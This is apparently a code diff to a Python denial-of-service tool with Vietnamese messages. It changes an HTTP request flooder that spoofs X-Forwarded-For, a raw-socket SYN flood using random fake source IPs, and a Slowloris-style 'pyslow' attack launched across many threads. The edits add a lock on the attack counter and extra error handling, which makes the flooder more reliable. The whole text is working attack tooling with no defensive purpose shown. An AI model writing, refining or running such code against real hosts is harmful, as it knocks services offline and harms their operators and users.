@@ -10,16 +10,21 @@ from random import randrange, choice, randint
 import signal
 import string
 
+# Tạo một lock để đồng bộ hóa việc truy cập vào biến attack_num
+attack_num_lock = threading.Lock()
+attack_num = 0
+
 def fake_ip():
     while True:
-        ips = [str(randrange(0, 256)) for i in range(4)]
+        ips = [str(randrange(0, 256)) for _ in range(4)]
         if ips[0] == "127":
             continue
         fkip = '.'.join(ips)
         break
     return fkip
 
-def ddos_requester(target_host, target_port, target_path, fake_ip, attack_num):
+def ddos_requester(target_host, target_port, target_path, fake_ip):
+    global attack_num
     headers = {
         'Host': target_host,
         'X-Forwarded-For': fake_ip,
@@ -31,7 +36,8 @@ def ddos_requester(target_host, target_port, target_path, fake_ip, attack_num):
     while True:
         try:
             response = requests.get(f"http://{target_host}:{target_port}{target_path}", headers=headers)
-            attack_num += 1
+            with attack_num_lock:
+                attack_num += 1
             print(f"Gói tin đã gửi! Số lần tấn công: {attack_num} - Mã phản hồi: {response.status_code}")
         except requests.RequestException as e:
             print(f"Lỗi: {e}")
@@ -87,6 +93,8 @@ def syn_flood(tgt, port, fake_ip):
             sock.sendto(packet, (tgt, 0))
     except KeyboardInterrupt:
         print("Đã dừng SYN Flood.")
+    except Exception as e:
+        print(f"Lỗi trong SYN Flood: {e}")
 
 def pyslow(tgt, port, threads, sleep):
     try:
@@ -98,6 +106,8 @@ def pyslow(tgt, port, threads, sleep):
                 time.sleep(sleep)
     except KeyboardInterrupt:
         print("Đã dừng Pyslow.")
+    except Exception as e:
+        print(f"Lỗi trong Pyslow: {e}")
 
 def menu():
     print(Style.BRIGHT + Fore.YELLOW + "[THÔNG TIN!]" + Fore.WHITE + " Nhấn CTRL + C và nhấn ENTER để thoát!!")
@@ -173,14 +183,12 @@ def ddos_with_spoofing(attack_type):
     print("giây: 1")
     time.sleep(1)
 
-    attack_num = 0
-
     if attack_type == 'requester':
-        for i in range(threads):
-            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip, attack_num))
+        for _ in range(threads):
+            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip))
             thread.start()
     elif attack_type == 'synflood':
-        for i in range(threads):
+        for _ in range(threads):
             thread = threading.Thread(target=syn_flood, args=(target_host, target_port, fake_ip))
             thread.start()
     elif attack_type == 'pyslow':
